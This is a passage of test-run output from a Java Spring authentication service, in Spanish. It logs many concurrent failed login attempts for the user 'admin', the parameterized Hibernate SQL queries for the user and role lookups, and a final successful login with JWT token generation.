17:10:36.882 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.882 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.883 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.883 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.887 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.889 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.899 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.901 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.949 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.950 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.969 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.971 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.022 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.025 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.054 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.055 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.064 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.066 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.076 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.078 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.141 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.145 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.167 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.168 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.197 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.198 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.210 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.210 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.229 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.229 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.258 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.258 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.260 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.261 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.262 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.263 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.331 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.332 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.402 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.403 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.405 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.405 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.473 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.473 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.481 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.483 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.766 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:37.769 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:37.769 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:37 MST 2025, expiration: Wed Jul 02 18:10:37 MST 2025
17:10:37.771 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:37.772 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:37.772 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
]]></system-out>
  </testcase>
</testsuite>